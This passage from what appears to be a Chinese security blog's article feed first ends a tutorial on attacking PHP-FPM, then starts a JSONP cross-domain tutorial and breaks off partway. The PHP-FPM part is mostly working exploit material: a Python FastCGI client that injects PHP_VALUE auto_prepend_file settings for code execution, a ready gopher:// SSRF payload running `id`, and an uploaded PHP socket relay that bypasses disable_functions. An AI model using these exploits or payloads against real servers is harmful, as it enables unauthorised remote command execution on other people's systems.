timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="keyword">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="keyword">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span><span class="params">(self, fcgi_type, content, requestid)</span>:</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span><span class="params">(self, stream)</span>:</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">'version'</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">'type'</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">'requestId'</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">'contentLength'</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">'paddingLength'</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">'reserved'</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span><span class="params">(self, buffer)</span>:</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">'content'</span>] = <span class="string">b''</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">'contentLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">'contentLength'</span>])</span><br><span class="line">                record[<span class="string">'content'</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'paddingLength'</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">'paddingLength'</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span><span class="params">(self, nameValuePairs=&#123;&#125;, post=<span class="string">''</span>)</span>:</span></span><br><span class="line">       <span class="comment"># if not self.__connect():</span></span><br><span class="line">        <span class="comment">#    print('connect failure! please check your fasctcgi-server !!')</span></span><br><span class="line">         <span class="comment">#   return</span></span><br><span class="line"> </span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b""</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b''</span>, requestId)</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b''</span>, requestId)</span><br><span class="line">        <span class="comment">#print base64.b64encode(request)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line">        <span class="comment"># self.sock.send(request)</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment"># self.requests[requestId]['response'] = b''</span></span><br><span class="line">        <span class="comment"># return self.__waitForResponse(requestId)</span></span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span><span class="params">(self, requestId)</span>:</span></span><br><span class="line">        data = <span class="string">b''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"> </span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">'state'</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">'requestId'</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">'response'</span>] += response[<span class="string">'content'</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">'type'</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">'response'</span>]</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"fastcgi connect host:&#123;&#125; port:&#123;&#125;"</span>.format(self.host, self.port)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">'Php-fpm code execution vulnerability client.'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'host'</span>, help=<span class="string">'Target host, such as 127.0.0.1'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'file'</span>, help=<span class="string">'A php file absolute path, such as /usr/local/lib/php/System.php'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-c'</span>, <span class="string">'--code'</span>, help=<span class="string">'What php code your want to execute'</span>, default=<span class="string">'&lt;?php phpinfo(); exit; ?&gt;'</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'-p'</span>, <span class="string">'--port'</span>, help=<span class="string">'FastCGI port'</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"> </span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">"/"</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'GATEWAY_INTERFACE'</span>: <span class="string">'FastCGI/1.0'</span>,</span><br><span class="line">        <span class="string">'REQUEST_METHOD'</span>: <span class="string">'POST'</span>,</span><br><span class="line">        <span class="string">'SCRIPT_FILENAME'</span>: documentRoot + uri.lstrip(<span class="string">'/'</span>),</span><br><span class="line">        <span class="string">'SCRIPT_NAME'</span>: uri,</span><br><span class="line">        <span class="string">'QUERY_STRING'</span>: <span class="string">''</span>,</span><br><span class="line">        <span class="string">'REQUEST_URI'</span>: uri,</span><br><span class="line">        <span class="string">'DOCUMENT_ROOT'</span>: documentRoot,</span><br><span class="line">        <span class="string">'SERVER_SOFTWARE'</span>: <span class="string">'php/fcgiclient'</span>,</span><br><span class="line">        <span class="string">'REMOTE_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'REMOTE_PORT'</span>: <span class="string">'9985'</span>,</span><br><span class="line">        <span class="string">'SERVER_ADDR'</span>: <span class="string">'127.0.0.1'</span>,</span><br><span class="line">        <span class="string">'SERVER_PORT'</span>: <span class="string">'80'</span>,</span><br><span class="line">        <span class="string">'SERVER_NAME'</span>: <span class="string">"localhost"</span>,</span><br><span class="line">        <span class="string">'SERVER_PROTOCOL'</span>: <span class="string">'HTTP/1.1'</span>,</span><br><span class="line">        <span class="string">'CONTENT_TYPE'</span>: <span class="string">'application/text'</span>,</span><br><span class="line">        <span class="string">'CONTENT_LENGTH'</span>: <span class="string">"%d"</span> % len(content),</span><br><span class="line">        <span class="string">'PHP_VALUE'</span>: <span class="string">'auto_prepend_file = php://input'</span>,</span><br><span class="line">        <span class="string">'PHP_ADMIN_VALUE'</span>: <span class="string">'allow_url_include = On'</span></span><br><span class="line">    &#125;</span><br><span class="line">    response = client.request(params, content)</span><br><span class="line">    response = urllib.quote(response)</span><br><span class="line">    print(<span class="string">"gopher://127.0.0.1:"</span> + str(args.port) + <span class="string">"/_"</span> + response)</span><br></pre></td></tr></table></figure><h3 id="攻击利用-1"><a href="#攻击利用-1" class="headerlink" title="攻击利用"></a>攻击利用</h3><p>前提条件是目标站点存在SSRF漏洞，代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span><span class="params">($url)</span></span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">    curl_exec($ch);</span><br><span class="line">    curl_close($ch); </span><br><span class="line">&#125;</span><br><span class="line">$url = $_GET[<span class="string">'url'</span>];</span><br><span class="line">curl($url);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而且目标站点的PHP-FPM服务只在本地监听，外网访问不了，这里我们外网用nmap扫发现被过滤了：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/10.png" alt=""></p><p>此时，直接用前面改过的脚本，运行如下命令，FPM地址写本地就好：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python fpm_ssrf.py -c &apos;&lt;?php echo `id`;exit;?&gt;&apos; -p 9000 127.0.0.1 /usr/local/lib/php/PEAR.php</span><br></pre></td></tr></table></figure><p><img src="/2019/08/25/浅谈PHP-FPM安全/11.png" alt=""></p><p>得到如下Gopher协议包数据：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:9000/_%01%01z1%00%08%00%00%00%01%00%00%00%00%00%00%01%04z1%01%E7%00%00%0E%02CONTENT_LENGTH23%0C%10CONTENT_TYPEapplication/text%0B%04REMOTE_PORT9985%0B%09SERVER_NAMElocalhost%11%0BGATEWAY_INTERFACEFastCGI/1.0%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0F%1BSCRIPT_FILENAME/usr/local/lib/php/PEAR.php%0B%1BSCRIPT_NAME/usr/local/lib/php/PEAR.php%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A//input%0E%04REQUEST_METHODPOST%0B%02SERVER_PORT80%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%0D%01DOCUMENT_ROOT/%0B%09SERVER_ADDR127.0.0.1%0B%1BREQUEST_URI/usr/local/lib/php/PEAR.php%01%04z1%00%00%00%00%01%05z1%00%17%00%00%3C%3Fphp%20echo%20%60id%60%3Bexit%3B%3F%3E%01%05z1%00%00%00%00</span><br></pre></td></tr></table></figure><p>在打SSRF之前，需要再进行一次URL编码，这是因为在服务端中Nginx和FPM分别会进行一次URL解码：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/12.png" alt=""></p><p>编码后直接SSRF打过去就好了：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/13.png" alt=""></p><h2 id="0x06-攻击Unix套接字模式下的PHP-FPM"><a href="#0x06-攻击Unix套接字模式下的PHP-FPM" class="headerlink" title="0x06 攻击Unix套接字模式下的PHP-FPM"></a>0x06 攻击Unix套接字模式下的PHP-FPM</h2><p>前面说的Unix Socket模式就讲到，这种模式在同一环境下是通过如<code>/run/php/php7.3-fpm.sock</code>的sock文件来进行通信的。</p><p>具体的攻击场景可参考*CTF echohub这道题，题目做到后面是涉及到如何绕过disable_functions，而从题目中获取的信息可知服务器是还存在一个FPM服务且是以Unix套接字模式进行通信的。</p><p>如何攻击利用呢？</p><p>这里参考了ROIS的wp，由于stream_socket_client()函数未被禁用，因此我们可以利用它来和本地Unix套接字模式的FPM服务进行通信，下面的脚本是建立一个Unix Socket客户端连接，然后写入TCP流进行通信，内容是我们恶意构造的FastCGI协议报文：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$sock=stream_socket_client(<span class="string">'unix:///run/php/php7.3-fpm.sock'</span>);</span><br><span class="line">fputs($sock, base64_decode($_POST[<span class="string">'A'</span>]));</span><br><span class="line">var_dump(fread($sock, <span class="number">4096</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//来自https://xz.aliyun.com/t/5006#toc-3 </span></span><br><span class="line"><span class="comment">//ROIS的*CTF WP</span></span><br></pre></td></tr></table></figure><p>将该PHP文件上传到目标服务端，等待我们发送的Unix Socket连接来传输TCP流数据、。</p><p>接着，在前面SSRF脚本的基础上，改掉最后的几行代码，将URL编码和拼接Gopher协议部分注释掉，取而代之的是对FastCGI协议报文进行base64编码并输出出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">response = client.request(params, content)</span><br><span class="line"><span class="comment"># response = urllib.quote(response)</span></span><br><span class="line"><span class="comment"># print("gopher://127.0.0.1:" + str(args.port) + "/_" + response)</span></span><br><span class="line">response = base64.b64encode(response)</span><br><span class="line">print(response)</span><br></pre></td></tr></table></figure><p>运行后得到base64编码内容：</p><p><img src="/2019/08/25/浅谈PHP-FPM安全/14.png" alt=""></p><p>最后，只需将编码后的内容发到前面上传的PHP文件中和FPM服务进行Unix Socket通信，从而绕过disable_functions、达到任意命令执行的目的。</p><p>由于已无题目环境，这里就无截图了。</p><h2 id="0x07-助攻disable-functions绕过"><a href="#0x07-助攻disable-functions绕过" class="headerlink" title="0x07 助攻disable_functions绕过"></a>0x07 助攻disable_functions绕过</h2><p>具体的可参考<a href="https://www.mi1k7ea.com/2019/08/03/从蚁剑插件看利用PHP-FPM绕过disable-functions/">《从蚁剑插件看利用PHP-FPM绕过disable_functions》</a>。</p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="http://vinc.top/?p=589" target="_blank" rel="noopener">【运维安全】Fastcgi配置不当对外开放利用</a></p><p><a href="https://xz.aliyun.com/t/5598" target="_blank" rel="noopener">浅析php-fpm的攻击方式</a></p><p><a href="https://cloud.tencent.com/developer/article/1425023" target="_blank" rel="noopener">PHP 连接方式介绍以及如何攻击 PHP-FPM</a></p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>JSONP跨域漏洞总结</title>
    <link href="https://www.mi1k7ea.com/2019/08/20/JSONP%E8%B7%A8%E5%9F%9F%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    <id>https://www.mi1k7ea.com/2019/08/20/JSONP跨域漏洞总结/</id>
    <published>2019-08-20T13:19:12.000Z</published>
    <updated>2019-09-01T10:44:58.427Z</updated>
    
    <content type="html"><![CDATA[<p>JSONP是个老话题了，因为不太熟悉这里就总结下吧。</p><h2 id="0x01-JSONP"><a href="#0x01-JSONP" class="headerlink" title="0x01 JSONP"></a>0x01 JSONP</h2><h3 id="为何使用JSONP"><a href="#为何使用JSONP" class="headerlink" title="为何使用JSONP"></a>为何使用JSONP</h3><p>JSONP是实现跨域的一种技术，应用于Web站点需要跨域获取数据的场景。</p><p>简单说个情形就能理解了，不贴图了。</p><p>假设a.com下存在data.json文件：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; username: "mi1k7ea", password: "secret" &#125;</span><br></pre></td></tr></table></figure><p>而下面的html文件用于发起Ajax请求获取data.json的内容并记录日志：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'./jquery.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"> $.ajax(&#123;</span></span><br><span class="line"><span class="actionscript"> url: <span class="string">'http://a.com/data.json'</span>,</span></span><br><span class="line"><span class="actionscript"> type:<span class="string">"get"</span>,     </span></span><br><span class="line"><span class="actionscript"> dataType: <span class="string">"json"</span>,</span></span><br><span class="line"><span class="actionscript"> success: <span class="function"><span class="keyword">function</span> <span class="params">(data)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(data);&#125;</span></span><br><span class="line"><span class="undefined"> &#125;)</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果该HTML文件同处于a.com即和data.json同域时，访问该HTML文件能够正常获取json文件的内容。</p><p>但是如果该HTML文件放置在b.com下即与data.json文件不同域，访问该HTML文件时浏览器会报错，这是因为Ajax不能发起跨域请求。</p><p>但是开发为了方便程序间数据的调用，就搞了几种跨域的方法，其中包括了JSONP。</p><p>简单地说，就是利用script标签的src属性能够发起跨域请求的原理来实现的。</p><p>将该HTML文件改为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'./jquery.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript"> s.src = <span class="string">'http://a.com/data.json'</span>;</span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时再访问就发现可以跨域发起请求了，但是会看到浏览器报错，这时因为data.json中的内容并不符合JavaScript代码规范。</p><p>重新定义data.json文件让其符合JSONP规范：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">callback(&#123; username: "mi1k7ea", password: "secret" &#125;)</span><br></pre></td></tr></table></figure><p>然后在HTML文件中添加callback函数的定义即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">'./jquery.js'</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"> <span class="function"><span class="keyword">function</span> <span class="title">callback</span><span class="params">(json)</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="built_in">console</span>.log(json);</span></span><br><span class="line"><span class="undefined"> &#125;</span></span><br><span class="line"><span class="javascript"> <span class="keyword">var</span> s = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript"> s.src = <span class="string">'http://a.com/data.json'</span>;</span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.body.appendChild(s);</span></span><br><span class="line"><span class="undefined"> </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>此时，基本的JSONP功能就实现了，我们Web站点的HTML文件能够正常地跨域获取目标外域JSON数据了。</p><p>至此，我们就清楚了：JSONP就是跨域技术的一种，用来方便Web站点突破SOP的限制从外域端点获取数据。</p><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>过遍JSON和JSONP的基本概念吧。</p><p>JSON（JavaScript Object Notation），即JavaScript对象表示法。</p><p>JSONP（JSON with Padding）即填充式的JSON，通过填充额外的内容把JSON数据包装起来，变成一段有效的可以独立运行的JavaScript语句。它是基于JSON 格式的为解决跨域请求资源而产生的解决方案，基本原理是利用HTML里script元素标签，远程调用JSON文件来实现数据传递。</p><p>JSONP的基本语法为：callback({“name”:”alan”, “msg”:”success”})</p><p>常见的例子包括函数调用（如callback({“a”:”b”})）或变量赋值（var a={JSON data}）。</p><p>更多原理详解，推荐看看这篇文章：<a href="https://blog.csdn.net/hansexploration/article/details/80314948" target="_blank" rel="noopener">jsonp原理详解——终于搞清楚jsonp是啥了</a></p><h3 id="实现流程"><a href="#实现流程" class="headerlink" title="实现流程"></a>实现流程</h3><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>这里主要借鉴菜鸟教程的示例。</p><h4 id="原生形式"><a href="#原生形式" class="headerlink" title="原生形式"></a>原生形式</h4><p>jsonp.php，作为JSONP端点，动态生成JSONP格式数据，文件放置在第三方服务器中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: application/json'</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line">$jsoncallback = htmlspecialchars($_REQUEST [<span class="string">'callback'</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line">$json_data = <span class="string">'["mi1k7ea","https://www.mi1k7ea.com"]'</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> $jsoncallback . <span class="string">"("</span> . $json_data . <span class="string">")"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>jsonp.html，先在script标签中定义，再通过另一个script标签的src属性来实现跨域访问目标JSONP端点获取根据传参动态生成的JSONP数据，文件放置于本地服务器中：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 